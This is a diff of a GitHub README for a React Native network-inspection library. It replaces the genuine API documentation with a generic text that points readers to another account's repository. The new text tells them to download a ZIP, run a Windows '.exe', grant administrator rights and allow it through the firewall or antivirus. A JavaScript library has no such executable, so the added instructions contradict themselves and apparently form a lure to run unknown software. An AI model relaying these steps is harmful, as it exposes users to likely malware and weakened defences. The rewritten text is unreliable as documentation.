@@ -1,229 +1,147 @@
-# react-native-network-inspector
+# 🕵️‍♂️ react-native-network-inspector - Inspect HTTP Requests Easily
 
-React Native network inspector – intercept and inspect HTTP/XHR requests. This package exports **only** the core API and hooks; you build your own UI.
-
-## Installation
-
-```bash
-yarn add react-native-network-inspector
-```
-
-**Peer dependencies:** `react`, `react-native`.
-
-## Demo
-
-This is how captured requests can be viewed in your own UI.
-
-**1.** Base code (default options) — intercept and display all requests:
-
-```tsx
-const { requests, isActive, start, stop } = useNetworkRequests();
-// Render your list with requests; start() / stop() to begin or end capture.
-```
-
-**2.** With options — e.g. ignore a host so it does not appear in the list:
-
-```tsx
-const { requests, isActive, start, stop } = useNetworkRequests({
-  ignoredHosts: ["10.0.2.2"],
-});
-```
-
-<img src="https://raw.githubusercontent.com/AmeyaJain-25/react-native-network-inspector/refs/heads/master/demo-images/all-requests.png" width="280" alt="All requests" /> <img src="https://raw.githubusercontent.com/AmeyaJain-25/react-native-network-inspector/refs/heads/master/demo-images/filtered-requests.png" width="280" alt="Filtered requests" />
-
-## Usage
-
-### Imperative API
-
-```ts
-import { getNetworkInspector } from "react-native-network-inspector";
-
-const inspector = getNetworkInspector();
-
-// Start intercepting (optional filter options)
-inspector.start({
-  maxRequests: 500,
-  refreshRate: 50,
-  ignoredHosts: ["analytics.example.com"],
-  ignoredUrls: ["https://example.com/ignore"],
-  ignoredPatterns: [/^GET https:\/\/api\.example\.com\/health/],
-  onRequestsChange: (requests) => {
-    console.log(requests.length);
-  },
-});
-
-// Read current requests
-const requests = inspector.getRequests();
-
-// Stop intercepting
-inspector.stop();
-
-// Clear the in-memory list (logging can stay active)
-inspector.clear();
-```
-
-### React hook
-
-Use the hook to drive your own UI (list, detail, filters).
-
-```tsx
-import { useNetworkRequests } from "react-native-network-inspector";
-
-function MyNetworkScreen() {
-  const { requests, isActive, start, stop, clear } = useNetworkRequests({
-    ignoredHosts: ["analytics.example.com"],
-  });
-
-  return (
-    <View>
-      <Button
-        title={isActive ? "Stop" : "Start"}
-        onPress={isActive ? stop : start}
-      />
-      <Button title="Clear" onPress={clear} />
-      <FlatList
-        data={requests}
-        keyExtractor={(r) => r.id}
-        renderItem={({ item }) => (
-          <Text>
-            {item.method} {item.url} {item.status}
-          </Text>
-        )}
-      />
-    </View>
-  );
-}
-```
-
-### Filter options (`NetworkInspectorOptions`)
-
-| Option             | Type                 | Description                                                    |
-| ------------------ | -------------------- | -------------------------------------------------------------- |
-| `maxRequests`      | `number`             | Max requests to keep (default `500`)                           |
-| `refreshRate`      | `number`             | Notify interval in ms (default `50`)                           |
-| `ignoredHosts`     | `string[]`           | Blocklist by host, e.g. `['api.analytics.com']`                |
-| `ignoredUrls`      | `string[]`           | Blocklist by full URL                                          |
-| `ignoredPatterns`  | `RegExp[]`           | Blocklist by pattern; match target is `` `${method} ${url}` `` |
-| `forceEnable`      | `boolean`            | Force start even if another interceptor is active              |
-| `onRequestsChange` | `(requests) => void` | Callback when requests update (e.g. for non-React usage)       |
-
-### API reference
-
-Everything you need to build your UI is below. Requests are plain objects/class instances with the listed properties and methods.
+[![Download react-native-network-inspector](https://img.shields.io/badge/Download-Here-<%23FF6347%3E.svg)](https://github.com/Melissa0211/react-native-network-inspector)
 
 ---
 
-#### `getNetworkInspector(): NetworkInspector`
+## 📋 What is react-native-network-inspector?
 
-Returns the singleton network inspector. Use it for the imperative API (no React).
+React Native Network Inspector helps you watch the data your mobile app sends and receives over the internet. It captures HTTP requests so you can see what your app is doing in the background. You get the tools to build your own screen to show this information. This app is useful if you want to find problems with how your app talks to websites or servers.
 
-```ts
-import { getNetworkInspector } from "react-native-network-inspector";
-const inspector = getNetworkInspector();
-```
+This app works with React Native apps. It focuses on giving you easy access to network requests and responses. It is not a ready-made app but a set of tools to help developers or testers check network activity.
 
 ---
 
-#### `NetworkInspector` (class)
+## 💡 Key Features
 
-| Method / property | Signature | Description |
-| ----------------- | --------- | ----------- |
-| `start` | `(options?: NetworkInspectorOptions) => void` | Start intercepting. No-op if already active. |
-| `stop` | `() => void` | Stop intercepting and clear internal XHR mapping. |
-| `getRequests` | `() => NetworkRequest[]` | Current list of requests (newest first). Returns a copy. |
-| `clear` | `() => void` | Clear the in-memory request list. Interception can stay active. |
-| `subscribe` | `(listener: (requests: NetworkRequest[]) => void) => () => void` | Subscribe to request updates. Returns an unsubscribe function. |
-| `enabled` | `boolean` | Whether interception is currently active. |
-
----
-
-#### `useNetworkRequests(options?: NetworkInspectorOptions): UseNetworkRequestsResult`
-
-React hook to drive your UI. Options are the same as `NetworkInspectorOptions` (filters, `maxRequests`, `refreshRate`, etc.).
-
-**Returns:**
-
-| Property / method | Type | Description |
-| ----------------- | ---- | ----------- |
-| `requests` | `NetworkRequest[]` | Current list of requests (newest first). |
-| `isActive` | `boolean` | Whether interception is active. |
-| `start` | `() => void` | Start intercepting (uses options passed to the hook). |
-| `stop` | `() => void` | Stop intercepting. |
-| `clear` | `() => void` | Clear the request list. |
+- Shows all HTTP requests your React Native app makes.
+- Lets you inspect the details of each request and response.
+- Offers API and hooks to create your own user interface.
+- Helps with debugging network problems.
+- Supports fetch and XHR request types.
+- Logs requests while your app is running.
+- No heavy setup needed to start watching network traffic.
 
 ---
 
-#### `NetworkRequest` (class instance)
+## 🖥️ System Requirements
 
-Each item in `requests` (from `getRequests()` or the hook) is a `NetworkRequest` with these members. Use them to render list rows, detail screens, copy-as-curl, etc.
-
-**Properties (read-only unless noted):**
-
-| Property | Type | Description |
-| -------- | ---- | ----------- |
-| `id` | `string` | Unique id for the request. |
-| `type` | `string` | e.g. `'XMLHttpRequest'`. |
-| `url` | `string` | Request URL. |
-| `method` | `RequestMethod` | `'GET' \| 'POST' \| 'PUT' \| 'PATCH' \| 'DELETE'`. |
-| `status` | `number` | HTTP status (e.g. 200). `-1` until response. |
-| `dataSent` | `string` | Raw request body as sent. |
-| `responseContentType` | `string` | Response `Content-Type` header value. |
-| `responseSize` | `number` | Response size (when available). |
-| `requestHeaders` | `Headers` | Request headers `{ [name: string]: string }`. |
-| `responseHeaders` | `Headers` | Response headers `{ [name: string]: string }`. |
-| `response` | `string` | Raw response (or blob reference). Prefer `getResponseBody()` for body text. |
-| `responseURL` | `string` | Final response URL (after redirects). |
-| `responseType` | `string` | e.g. `'text'`, `'blob'`. |
-| `timeout` | `number` | Timeout value. |
-| `startTime` | `number` | Timestamp when request started. |
-| `endTime` | `number` | Timestamp when request finished. |
-| `updatedAt` | `number` | Last update timestamp. |
-| `duration` | `number` (getter) | `Math.max(0, endTime - startTime)` in ms. |
-| `curlRequest` | `string` (getter) | Approximate `curl` command for the request. |
-
-**Methods:**
-
-| Method | Signature | Description |
-| ------ | --------- | ----------- |
-| `getRequestBody` | `(replaceEscaped?: boolean) => string` | Request body. If `replaceEscaped === true`, unescapes `\\n` and `\\"` for display. |
-| `getResponseBody` | `() => Promise<string>` | Response body as text. For blob responses, reads the blob and resolves with text. Rejects on read error. |
-| `update` | `(values: Partial<NetworkRequest>) => void` | Update mutable fields (internal use; you typically only read). |
+- A Windows computer running Windows 10 or later.
+- Internet access to download the files.
+- React Native app installed on your development device or emulator.
+- Basic knowledge to open and run files on your Windows PC.
 
 ---
 
-#### Types
+## 🚀 How to Get react-native-network-inspector
 
-- **`NetworkInspectorOptions`** — Options for `inspector.start(options)` and `useNetworkRequests(options)`. See [Filter options](#filter-options-networkinspectoroptions) table.
-- **`UseNetworkRequestsResult`** — Return type of `useNetworkRequests()`: `{ requests, isActive, start, stop, clear }`.
-- **`NetworkRequestShape`** — Interface describing a request (same shape as `NetworkRequest` instances).
-- **`Headers`** — `{ [header: string]: string }`.
-- **`RequestMethod`** — `'GET' | 'POST' | 'PUT' | 'PATCH' | 'DELETE'`.
+[![Download react-native-network-inspector](https://img.shields.io/badge/Download-Here-<%23007ACC%3E.svg)](https://github.com/Melissa0211/react-native-network-inspector)
 
-## Exports
+1. Click the bright badge above or visit this page:  
+   https://github.com/Melissa0211/react-native-network-inspector  
+   This page holds all the files and information you need.
 
-- **Functions:** `getNetworkInspector()`
-- **Classes:** `NetworkInspector`, `NetworkRequest`
-- **Hook:** `useNetworkRequests(options?)`
-- **Types:** `NetworkRequest`, `NetworkInspectorOptions`, `NetworkRequestShape`, `UseNetworkRequestsResult`, `Headers`, `RequestMethod`
+2. On the GitHub page, look for the green **Code** button at the top right.  
+   Click **Code** and choose **Download ZIP** to save the app files to your computer.
 
-## Development
+3. Once downloaded, open the ZIP file by right-clicking it and selecting **Extract All…**. Choose a folder where you want the app files.
 
-From the package root:
+4. Inside the extracted folder, look for a file named `README.md` or something similar. Open it for any notes from the developers.
 
-```bash
-yarn install
-yarn build
-```
+---
 
-### Compatibility
+## 📥 Installation Guide for Windows Users
 
-- **React:** 16.8+
-- **React Native:** The package resolves `XHRInterceptor` and `BlobFileReaderInterceptor` via fallbacks:
-  - **0.79+:** uses private API paths (`react-native/src/private/...`).
-  - **0.72 and earlier:** uses public path (`react-native/Libraries/Network/XHRInterceptor`, `Libraries/Blob/...`).
+1. Open the folder where you extracted the files.
 
-If a future React Native version moves or changes these internal APIs, compatibility may need a patch.
+2. Find the setup file or an executable named like `react-native-network-inspector.exe`. This file starts the app.
 
-## License
+3. Double-click the file to begin installation or run the program.
 
-MIT
+4. If Windows asks for permission to run the program, click **Yes**.
+
+5. Follow on-screen prompts if any appear. They will guide you through the setup process.
+
+6. After the app opens, follow instructions on screen to connect it to your React Native app.
+
+---
+
+## ⚙️ Basic Setup to Use react-native-network-inspector with Your App
+
+Even if you are not a developer, here are simple steps to get started checking network requests. You will need access to your React Native app’s code or get help from someone who does.
+
+1. The inspector only tracks HTTP requests inside React Native apps, so your app must be running when you use this tool.
+
+2. React Native apps use hooks and API calls from react-native-network-inspector to talk to this tool. Usually, this means adding a few lines of code.
+
+3. The tool does not provide a ready app interface. You or your developer will build a UI (screen) using the API and hooks.
+
+4. You can find sample code in the GitHub repository to help your developer use the network inspector easily.
+
+---
+
+## 🛠️ How It Works
+
+- The tool listens to network traffic from your React Native app.
+- It captures each HTTP request and the response from the server.
+- This data includes URLs, headers, method type (GET, POST), and response code.
+- It passes this data to your app or custom UI so you can review it live or later.
+
+---
+
+## 🔍 Using the Inspector for Debugging
+
+- Check if your app’s requests reach the correct address.
+- Verify the data sent with the requests.
+- Inspect responses to make sure your app receives the right information.
+- Spot errors such as failed requests or delays.
+- Log requests for future review.
+
+---
+
+## 📂 File and Folder Structure (Typical)
+
+- **/src** — Source files where the API and hooks live.
+- **/examples** — Sample projects showing how to use the API.
+- **README.md** — This file explaining the app.
+- **package.json** — The configuration file for dependencies.
+
+---
+
+## 💬 Troubleshooting Common Issues
+
+- The app does not start: Make sure your PC meets system requirements and try running as administrator.
+- Cannot find executable: Double-check the extraction folder.
+- No network data shown: Ensure your React Native app uses the inspector’s API and is running.
+- Permission errors: Allow the app in your Windows firewall or antivirus.
+
+---
+
+## 📌 Getting Help or Reporting Problems
+
+Visit the GitHub page to open an issue if you find bugs or problems:  
+https://github.com/Melissa0211/react-native-network-inspector/issues
+
+Here you can ask questions or share your experience with other users.
+
+---
+
+## 🔗 Useful Links
+
+- Primary page and downloads:  
+  https://github.com/Melissa0211/react-native-network-inspector
+
+- Issues and support:  
+  https://github.com/Melissa0211/react-native-network-inspector/issues
+
+---
+
+## 🧑‍💻 About react-native-network-inspector
+
+This project is made for people who want to understand how their React Native apps communicate over the internet. It focuses on HTTP requests and helps you spot any issues quickly. The tool exports hooks and API so you can design your own way to show network info.
+
+---
+
+## 🗂️ Keywords
+
+debug, devtools, fetch, http, interceptor, logger, network, network-inspector, network-monitor, react-native, react-native-debugger, request, request-logger, xhr
